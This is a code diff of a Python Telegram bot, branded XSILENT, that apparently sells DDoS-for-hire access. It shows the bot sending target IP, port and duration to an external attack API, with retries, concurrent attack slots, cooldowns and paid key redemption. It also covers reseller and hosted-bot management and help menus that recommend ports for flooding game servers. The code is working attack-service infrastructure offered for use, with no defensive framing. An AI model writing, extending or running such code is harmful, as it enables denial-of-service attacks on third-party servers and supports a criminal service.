@@ -156,12 +156,15 @@ def format_duration(value, unit):
         return f"{value} Hour(s)"
     return f"{value} Day(s)"
 
-def get_main_active_count():
+def check_total_active_attacks():
     now = time.time()
+    count = 0
     for attack_id, info in list(active_attacks.items()):
-        if now >= info["finish_time"]:
+        if now < info["finish_time"]:
+            count += 1
+        else:
             del active_attacks[attack_id]
-    return len(active_attacks)
+    return count
 
 def check_active_attack_by_target(ip, port):
     target_key = f"{ip}:{port}"
@@ -240,42 +243,31 @@ def stop_hosted_bot(bot_token):
     except:
         return False
 
-# ========== SEND ATTACK FUNCTION (WORKING API) ==========
-def send_attack(ip, port, duration, chat_id, bot_instance, is_hosted=False, bot_token=None):
-    """Send attack to API - WORKING VERSION"""
-    max_retries = 2
-    for attempt in range(max_retries):
-        try:
-            # EXACT SAME API format as working bot
-            api_params = {
-                "api_key": API_KEY,
-                "target": ip,
-                "port": port,
-                "time": duration,
-                "concurrent": 1
-            }
-            
-            response = requests.get(API_URL, params=api_params, timeout=20)
-            
-            if response.status_code == 200:
-                time.sleep(duration)
-                bot_instance.send_message(chat_id, f"✅ ATTACK FINISHED!\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n🔄 Restart your game!")
-                return True
-            else:
-                if attempt < max_retries - 1:
-                    time.sleep(1)
-                    continue
-                bot_instance.send_message(chat_id, f"❌ Attack failed! Status: {response.status_code}")
-                return False
-                
-        except Exception as e:
-            if attempt < max_retries - 1:
-                time.sleep(1)
-                continue
-            bot_instance.send_message(chat_id, f"❌ Attack failed! {str(e)[:50]}")
+# ========== SEND ATTACK FUNCTION - CORRECT API FORMAT ==========
+def send_attack_to_api(ip, port, duration, chat_id, bot_instance, is_hosted=False):
+    """Correct API call - NO method parameter"""
+    try:
+        api_params = {
+            "api_key": API_KEY,
+            "target": ip,
+            "port": port,
+            "time": duration,
+            "concurrent": 1
+        }
+        response = requests.get(API_URL, params=api_params, timeout=15)
+        print(f"API Response Status: {response.status_code}")
+        print(f"API Response Text: {response.text}")
+        
+        if response.status_code == 200:
+            time.sleep(duration)
+            bot_instance.send_message(chat_id, f"✅ ATTACK FINISHED!\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n🔄 Restart your game!")
+            return True
+        else:
+            bot_instance.send_message(chat_id, f"❌ Attack failed! Status: {response.status_code}")
             return False
-    
-    return False
+    except Exception as e:
+        bot_instance.send_message(chat_id, f"❌ Attack error: {str(e)[:50]}")
+        return False
 
 # ========== AUTO KEY EXPIRY CLEANUP ==========
 def cleanup_expired_keys():
@@ -424,19 +416,6 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
                 hosted_bot.reply_to(msg, "❌ Invalid port or time!")
                 return
             
-            # Check hosted bot's own concurrent limit
-            if bot_token in hosted_bots:
-                bot_info = hosted_bots[bot_token]
-                active_in_this_bot = 0
-                now = time.time()
-                for aid, ainfo in bot_info.get("active_attacks", {}).items():
-                    if now < ainfo["finish_time"]:
-                        active_in_this_bot += 1
-                
-                if active_in_this_bot >= concurrent:
-                    hosted_bot.reply_to(msg, f"❌ CONCURRENT LIMIT REACHED!\n📊 Active attacks: {active_in_this_bot}/{concurrent}\n💡 Use /status to check when a slot frees up")
-                    return
-            
             now = time.time()
             
             if uid in hosted_cooldown_data:
@@ -449,7 +428,7 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
             target_key = f"{ip}:{port}"
             finish_time = now + duration
             
-            # Check target under attack
+            # Check if target already under attack
             target_under_attack = False
             if bot_token in hosted_bots:
                 for aid, ainfo in hosted_bots[bot_token].get("active_attacks", {}).items():
@@ -482,12 +461,11 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
                 if now < ainfo["finish_time"]:
                     new_active += 1
             
-            hosted_bot.reply_to(msg, f"✨ ATTACK LAUNCHED! ✨\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n⚡ Method: UDP (Auto)\n📊 Active Slots: {new_active}/{concurrent}")
+            hosted_bot.reply_to(msg, f"✨ ATTACK LAUNCHED! ✨\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n⚡ Method: UDP (Auto)\n📊 Active Slots: {new_active}/{concurrent}\n🔄 Sending to API...")
             
             def run():
-                send_attack(ip, port, duration, msg.chat.id, hosted_bot, is_hosted=True, bot_token=bot_token)
+                send_attack_to_api(ip, port, duration, msg.chat.id, hosted_bot, is_hosted=True)
                 
-                # Cleanup
                 if bot_token in hosted_bots and attack_id in hosted_bots[bot_token]["active_attacks"]:
                     del hosted_bots[bot_token]["active_attacks"][attack_id]
                     save_hosted_bots(hosted_bots)
@@ -559,6 +537,7 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
             else:
                 hosted_bot.reply_to(msg, "❌ User is not a reseller!")
         
+                
         @hosted_bot.message_handler(commands=['genkey'])
         def hosted_genkey(msg):
             uid = str(msg.chat.id)
@@ -864,9 +843,9 @@ def attack(msg):
         bot.reply_to(msg, f"❌ Your access has expired!\n\n🛒 Buy new key: XSILENT")
         return
     
-    main_active = get_main_active_count()
-    if main_active >= MAX_CONCURRENT:
-        bot.reply_to(msg, f"❌ GLOBAL LIMIT REACHED!\n🌐 Total active attacks: {main_active}/{MAX_CONCURRENT}\n💡 Wait for an attack to finish.\n\n⚡ Use /status to check current attacks")
+    total_active = check_total_active_attacks()
+    if total_active >= MAX_CONCURRENT:
+        bot.reply_to(msg, f"❌ All attack slots are full!\n📊 Total active: {total_active}/{MAX_CONCURRENT}\n💡 Use /status to check")
         return
     
     if uid in cooldown and not is_group:
@@ -924,11 +903,25 @@ def attack(msg):
         "start_time": time.time()
     }
     
-    new_total = get_main_active_count()
-    bot.reply_to(msg, f"✨ ATTACK LAUNCHED! ✨\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n⚡ Method: UDP (Auto)\n🌐 Global Active: {new_total}/{MAX_CONCURRENT}")
+    new_total = check_total_active_attacks()
+    bot.reply_to(msg, f"✨ ATTACK LAUNCHED! ✨\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n⚡ Method: UDP (Auto)\n📊 Total active slots: {new_total}/{MAX_CONCURRENT}")
     
     def run():
-        send_attack(ip, port, duration, msg.chat.id, bot, is_hosted=False)
+        retry = 0
+        while retry < 3:
+            try:
+                api_params = {"api_key": API_KEY, "target": ip, "port": port, "time": duration, "concurrent": 1}
+                response = requests.get(API_URL, params=api_params, timeout=10)
+                if response.status_code == 200:
+                    time.sleep(duration)
+                    bot.send_message(msg.chat.id, f"✅ ATTACK FINISHED!\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n🔄 Restart your game!")
+                    break
+                else:
+                    retry += 1
+                    time.sleep(2)
+            except:
+                retry += 1
+                time.sleep(2)
         if attack_id in active_attacks:
             del active_attacks[attack_id]
     
@@ -947,7 +940,7 @@ def status(msg):
         return
     
     slots_status = format_attack_status()
-    total_active = get_main_active_count()
+    total_active = check_total_active_attacks()
     
     status_msg = "📊 SLOT STATUS\n\n"
     status_msg += "\n\n".join(slots_status)
@@ -974,7 +967,7 @@ def host_bot(msg):
     
     args = msg.text.split()
     if len(args) != 5:
-        bot.reply_to(msg, "⚠️ Usage: /host BOT_TOKEN USER_ID CONCURRENT NAME\n📌 Concurrent: 1-20\n📌 Example: /host 123456:ABC 8487946379 2 MONSTER")
+        bot.reply_to(msg, "⚠️ Usage: /host BOT_TOKEN USER_ID CONCURRENT NAME\n📌 Concurrent: 1-20\n📌 Example: /host 123456:ABC 8487946379 10 MONSTER")
         return
     
     bot_token = args[1]
@@ -994,6 +987,7 @@ def host_bot(msg):
         "owner_id": owner_id,
         "owner_name": owner_name,
         "concurrent": concurrent,
+        "blocked": False,
         "active_attacks": {},
         "users": [],
         "resellers": []
@@ -1001,7 +995,7 @@ def host_bot(msg):
     save_hosted_bots(hosted_bots)
     
     if start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
-        bot.reply_to(msg, f"✅ HOSTED BOT STARTED!\n\n🔑 Token: {bot_token[:20]}...\n👑 Owner: {owner_id}\n📛 Name: {owner_name}\n⚡ Concurrent: {concurrent}\n\n💡 Bot is now live!")
+        bot.reply_to(msg, f"✅ HOSTED BOT STARTED!\n\n🔑 Token: {bot_token[:20]}...\n👑 Owner: {owner_id}\n📛 Name: {owner_name}\n⚡ Concurrent: {concurrent}\n⏳ Cooldown: {COOLDOWN_TIME}s\n\n💡 Bot is now live!")
     else:
         bot.reply_to(msg, "❌ Failed to start hosted bot! Check token and try again.")
 
@@ -1042,7 +1036,8 @@ def all_hosts(msg):
     
     host_list = []
     for token, info in hosted_bots.items():
-        host_list.append(f"🔑 {token[:20]}...\n└ 👑 Owner: {info['owner_id']}\n└ 📛 Name: {info['owner_name']}\n└ ⚡ Concurrent: {info['concurrent']}")
+        status = "🔴 BLOCKED" if info.get("blocked", False) else "🟢 ACTIVE"
+        host_list.append(f"🔑 {token[:20]}...\n└ 👑 Owner: {info['owner_id']}\n└ 📛 Name: {info['owner_name']}\n└ ⚡ Concurrent: {info['concurrent']}\n└ {status}")
     
     if host_list:
         bot.reply_to(msg, f"📋 ALL HOSTED BOTS:\n\n" + "\n\n".join(host_list) + f"\n\n📊 Total: {len(hosted_bots)}")
@@ -1059,18 +1054,20 @@ def maintenance(msg):
     
     args = msg.text.split()
     if len(args) != 2:
-        bot.reply_to(msg, "⚠️ Usage: /maintenance on/off")
+        bot.reply_to(msg, "⚠️ Usage: /maintenance on or /maintenance off")
         return
     
     global maintenance_mode
-    if args[1] == "on":
+    status = args[1].lower()
+    
+    if status == "on":
         maintenance_mode = True
-        bot.reply_to(msg, "🔧 MAINTENANCE MODE ENABLED")
-    elif args[1] == "off":
+        bot.reply_to(msg, "🔧 MAINTENANCE MODE ENABLED 🔧\n\nBot commands are now disabled.\nUse /maintenance off to disable.")
+    elif status == "off":
         maintenance_mode = False
-        bot.reply_to(msg, "✅ MAINTENANCE MODE DISABLED")
+        bot.reply_to(msg, "✅ MAINTENANCE MODE DISABLED ✅\n\nBot is now fully operational!")
     else:
-        bot.reply_to(msg, "❌ Use on/off")
+        bot.reply_to(msg, "❌ Invalid status! Use on or off")
 
 @bot.message_handler(commands=['genkey'])
 def genkey(msg):
@@ -1342,16 +1339,17 @@ def mykeys(msg):
         bot.reply_to(msg, "❌ Unauthorized!")
         return
     
-    my_keys = []
+    my_generated_keys = []
     for key, info in keys_data.items():
         if info.get("generated_by") == uid and not info.get("used", False):
             expires = datetime.fromtimestamp(info["expires_at"]).strftime('%Y-%m-%d')
-            my_keys.append(f"🔑 {key}\n   ⏰ {format_duration(info['duration_value'], info['duration_unit'])}\n   📅 Expires: {expires}")
+            duration_display = format_duration(info['duration_value'], info['duration_unit'])
+            my_generated_keys.append(f"🔑 {key}\n   ⏰ {duration_display}\n   📅 Expires: {expires}")
     
-    if my_keys:
-        bot.reply_to(msg, "📋 YOUR GENERATED KEYS:\n\n" + "\n\n".join(my_keys))
+    if my_generated_keys:
+        bot.reply_to(msg, f"📋 YOUR GENERATED KEYS:\n\n" + "\n\n".join(my_generated_keys))
     else:
-        bot.reply_to(msg, "📋 No keys generated yet!")
+        bot.reply_to(msg, f"📋 No keys generated yet!\n\n🛒 Buy: XSILENT")
 
 @bot.message_handler(commands=['broadcast'])
 def broadcast(msg):
@@ -1361,12 +1359,14 @@ def broadcast(msg):
         bot.reply_to(msg, "❌ Owner only!")
         return
     
-    all_users = [u for u in broadcast_users]
+    all_broadcast_users = [u for u in broadcast_users]
     
     if msg.reply_to_message:
-        success, fail = 0, 0
+        success_count = 0
+        fail_count = 0
         caption = msg.text.split(maxsplit=1)[1] if len(msg.text.split(maxsplit=1)) > 1 else ""
-        for user in all_users:
+        
+        for user in all_broadcast_users:
             try:
                 if msg.reply_to_message.photo:
                     bot.send_photo(user, msg.reply_to_message.photo[-1].file_id, caption=caption)
@@ -1374,24 +1374,30 @@ def broadcast(msg):
                     bot.send_video(user, msg.reply_to_message.video.file_id, caption=caption)
                 else:
                     bot.send_message(user, caption)
-                success += 1
+                success_count += 1
             except:
-                fail += 1
-        bot.reply_to(msg, f"✅ BROADCAST SENT!\n✅ Success: {success}\n❌ Failed: {fail}")
+                fail_count += 1
+        
+        bot.reply_to(msg, f"✅ BROADCAST SENT!\n✅ Success: {success_count} users\n❌ Failed: {fail_count} users")
     else:
         args = msg.text.split(maxsplit=1)
         if len(args) != 2:
-            bot.reply_to(msg, "⚠️ Usage: /broadcast MESSAGE\n💡 Or reply to photo/video")
+            bot.reply_to(msg, "⚠️ Usage: /broadcast MESSAGE\n💡 Or reply to a photo/video with caption")
             return
+        
         message = args[1]
-        success, fail = 0, 0
-        for user in all_users:
+        
+        success_count = 0
+        fail_count = 0
+        
+        for user in all_broadcast_users:
             try:
-                bot.send_message(user, f"📢 BROADCAST\n\n{message}")
-                success += 1
+                bot.send_message(user, f"📢 BROADCAST MESSAGE 📢\n\n{message}\n\n🛒 Buy: XSILENT")
+                success_count += 1
             except:
-                fail += 1
-        bot.reply_to(msg, f"✅ BROADCAST SENT!\n✅ Success: {success}\n❌ Failed: {fail}")
+                fail_count += 1
+        
+        bot.reply_to(msg, f"✅ BROADCAST SENT!\n✅ Success: {success_count} users\n❌ Failed: {fail_count} users")
 
 @bot.message_handler(commands=['stopattack'])
 def stop_attack(msg):
@@ -1409,68 +1415,175 @@ def stop_attack(msg):
     target = args[1]
     
     stopped = False
-    for aid, info in list(active_attacks.items()):
+    for attack_id, info in list(active_attacks.items()):
         if info["target_key"] == target:
-            del active_attacks[aid]
+            del active_attacks[attack_id]
             stopped = True
             bot.reply_to(msg, f"✅ ATTACK STOPPED!\n🎯 Target: {target}\n👤 Attacker: {info['user']}")
+            try:
+                bot.send_message(info['user'], f"⚠️ Your attack on {target} was stopped by owner!")
+            except:
+                pass
             break
     
     if not stopped:
-        bot.reply_to(msg, f"❌ No attack found on {target}")
+        bot.reply_to(msg, f"❌ No active attack found on {target}")
 
 @bot.message_handler(commands=['methods'])
 def methods(msg):
+    uid = str(msg.chat.id)
+    chat_type = msg.chat.type
+    
+    if check_maintenance():
+        bot.reply_to(msg, "🔧 Maintenance!")
+        return
+    
+    if chat_type == "group" or chat_type == "supergroup":
+        bot.reply_to(msg, f"⚡ UDP AUTO ATTACK\n\n💡 Best for gaming\n🎯 Recommended ports: 443, 8080\n\n📌 USAGE:\n/attack IP PORT")
+    elif uid in users or uid in ADMIN_ID or uid in resellers:
+        bot.reply_to(msg, f"⚡ UDP AUTO ATTACK\n\n💡 Best for gaming (BGMI, Minecraft)\n🎯 Recommended ports: 443, 8080, 14000\n\n📌 USAGE:\n/attack IP PORT TIME\n\n📌 Example: /attack 1.1.1.1 443 60\n\n🛒 Buy: XSILENT")
+    else:
+        bot.reply_to(msg, "❌ Unauthorized!")
+
+@bot.message_handler(commands=['stats'])
+def stats(msg):
     uid = str(msg.chat.id)
     
     if check_maintenance():
         bot.reply_to(msg, "🔧 Maintenance!")
         return
     
-    if uid in users or uid in ADMIN_ID or uid in resellers:
-        bot.reply_to(msg, "⚡ UDP AUTO ATTACK\n\n💡 Best for gaming\n🎯 Recommended ports: 443, 8080, 14000\n\nUSAGE:\n/attack IP PORT TIME\n\nExample: /attack 1.1.1.1 443 60")
-    else:
+    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
         bot.reply_to(msg, "❌ Unauthorized!")
+        return
+    
+    has_active = check_user_expiry(uid)
+    status_text = "Active" if has_active else "Expired"
+    cooldown_text = "Yes" if uid in cooldown else "No"
+    if uid in cooldown:
+        remaining = COOLDOWN_TIME - (time.time() - cooldown[uid])
+        if remaining > 0:
+            cooldown_text = f"{int(remaining)}s left"
+    
+    bot.reply_to(msg, f"📊 YOUR STATS\n\n👤 ID: {uid}\n✅ Status: {status_text}\n⏳ Cooldown: {cooldown_text}\n\n🛒 Buy: XSILENT")
+
+@bot.message_handler(commands=['help'])
+def help_cmd(msg):
+    uid = str(msg.chat.id)
+    chat_type = msg.chat.type
+    
+    if check_maintenance():
+        bot.reply_to(msg, "🔧 Maintenance!")
+        return
+    
+    if chat_type == "group" or chat_type == "supergroup":
+        bot.reply_to(msg, f"✨ XSILENT GROUP HELP ✨\n\n📝 COMMANDS:\n/attack IP PORT - Launch attack\n/help - This menu\n/start - Bot info")
+    elif uid in ADMIN_ID:
+        bot.reply_to(msg, f"""👑 XSILENT OWNER HELP 👑
+
+📝 COMMANDS:
+
+/attack IP PORT TIME - Launch attack
+/status - Check slots
+/cooldown - Check your cooldown
+/setmax 1-100 - Set concurrent limit
+/setcooldown 1-300 - Set cooldown time
+
+/genkey 1 or 5h - Generate key
+/removekey KEY - Remove key
+
+/add USER - Add user
+/remove USER - Remove user
+/addreseller USER - Add reseller
+/removereseller USER - Remove reseller
+
+/addgroup GROUP_ID TIME - Add group
+/removegroup GROUP_ID - Remove group
+
+/host BOT_TOKEN USER_ID CONCURRENT NAME - Host bot
+/unhost BOT_TOKEN - Remove hosted bot
+
+/maintenance on/off - Maintenance mode
+/broadcast - Broadcast (text/photo/video)
+/stopattack IP:PORT - Stop attack
+/allusers - List users
+/allgroups - List groups
+/allhosts - List hosted bots
+/api_status - API status
+
+⚡ Concurrent: {MAX_CONCURRENT}
+⏳ Cooldown: {COOLDOWN_TIME}s
+🛒 Buy: XSILENT""")
+    elif uid in resellers:
+        bot.reply_to(msg, f"""💎 XSILENT RESELLER HELP 💎
+
+📝 COMMANDS:
+
+/attack IP PORT TIME - Launch attack
+/status - Check slots
+/cooldown - Check your cooldown
+/genkey 1 or 5h - Generate key
+/mykeys - Your keys
+
+⚡ Concurrent: {MAX_CONCURRENT}
+⏳ Cooldown: {COOLDOWN_TIME}s
+🛒 Buy: XSILENT""")
+    elif uid in users:
+        bot.reply_to(msg, f"""🔥 XSILENT USER HELP 🔥
+
+📝 COMMANDS:
+
+/attack IP PORT TIME - Launch attack
+/status - Check slots
+/cooldown - Check your cooldown
+/redeem KEY - Activate key
+
+⚡ Concurrent: {MAX_CONCURRENT}
+⏳ Cooldown: {COOLDOWN_TIME}s
+🛒 Buy: XSILENT""")
+    else:
+        bot.reply_to(msg, f"❌ Unauthorized!\n\nUse /redeem KEY to activate\n\n🛒 Buy: XSILENT")
 
 @bot.message_handler(commands=['allusers'])
 def all_users(msg):
     if str(msg.chat.id) not in ADMIN_ID:
-        bot.reply_to(msg, "❌ Admin only!")
+        bot.reply_to(msg, "❌ Owner only!")
         return
     
-    user_list = "\n".join(users)
-    bot.reply_to(msg, f"📋 USERS:\n{user_list}\nTotal: {len(users)}")
+    user_list = []
+    for u in users:
+        if u in ADMIN_ID:
+            role = "👑 OWNER"
+        elif u in resellers:
+            role = "💎 RESELLER"
+        else:
+            role = "👤 USER"
+        user_list.append(f"{role}: {u}")
+    
+    bot.reply_to(msg, f"📋 ALL USERS:\n\n" + "\n".join(user_list) + f"\n\nTotal: {len(users)}")
 
 @bot.message_handler(commands=['api_status'])
 def api_status(msg):
     if str(msg.chat.id) not in ADMIN_ID:
-        bot.reply_to(msg, "❌ Admin only!")
+        bot.reply_to(msg, "❌ Owner only!")
         return
     
     try:
-        test_response = requests.get(f"{API_URL}?api_key={API_KEY}&target=8.8.8.8&port=80&time=10&concurrent=1", timeout=5)
-        status = f"""🌐 API STATUS
-
-📡 API URL: {API_URL}
-🔑 API Key: {API_KEY[:6]}...{API_KEY[-4:]}
-✅ Status: {'Online' if test_response.status_code == 200 else 'Offline'}
-📊 Response Code: {test_response.status_code}"""
-        bot.reply_to(msg, status)
+        test_response = requests.get(f"{API_URL}?api_key={API_KEY}&target=8.8.8.8&port=80&time=5&concurrent=1", timeout=5)
+        api_status_text = "Online" if test_response.status_code == 200 else "Offline"
+        bot.reply_to(msg, f"✅ API STATUS\n\n📡 Status: {api_status_text}\n🎯 Active Attacks: {len(active_attacks)}")
     except:
-        bot.reply_to(msg, "🌐 API STATUS: OFFLINE\nCannot connect to API server!")
+        bot.reply_to(msg, "❌ API OFFLINE")
 
-def cleanup():
+def cleanup_attacks():
     while True:
         time.sleep(5)
         now = time.time()
-        for aid, info in list(active_attacks.items()):
+        
+        for attack_id, info in list(active_attacks.items()):
             if now >= info["finish_time"]:
-                del active_attacks[aid]
-        for btoken, binfo in hosted_bots.items():
-            for aid, info in list(binfo.get("active_attacks", {}).items()):
-                if now >= info["finish_time"]:
-                    del binfo["active_attacks"][aid]
-                    save_hosted_bots(hosted_bots)
+                del active_attacks[attack_id]
+        
         for key, info in list(keys_data.items()):
             if info.get("used", False) and now > info["expires_at"]:
                 user_id = info.get("used_by")
@@ -1479,19 +1592,15 @@ def cleanup():
                     users_data["users"] = users
                     save_users(users_data)
 
-threading.Thread(target=cleanup, daemon=True).start()
+cleanup_thread = threading.Thread(target=cleanup_attacks, daemon=True)
+cleanup_thread.start()
 
-print("""
-╔══════════════════════════════════════╗
-║    🔥 XSILENT BOT STARTED 🔥         ║
-║    API Mode Active                   ║
-╠══════════════════════════════════════╣
-║  ✅ Bot Online                       ║
-║  ✅ Admin: 8487946379                ║
-║  ✅ Methods: UDP Auto                ║
-║  ✅ API: CNC Connection              ║
-╚══════════════════════════════════════╝
-""")
+print("=" * 50)
+print("✨ XSILENT BOT STARTED ✨")
+print(f"👑 Owner: 8487946379")
+print(f"⚡ Global Concurrent: {MAX_CONCURRENT}")
+print(f"⏳ Cooldown: {COOLDOWN_TIME}s")
+print(f"📊 Hosted Bots: {len(hosted_bots)}")
+print("=" * 50)
 
 bot.infinity_polling()
-                
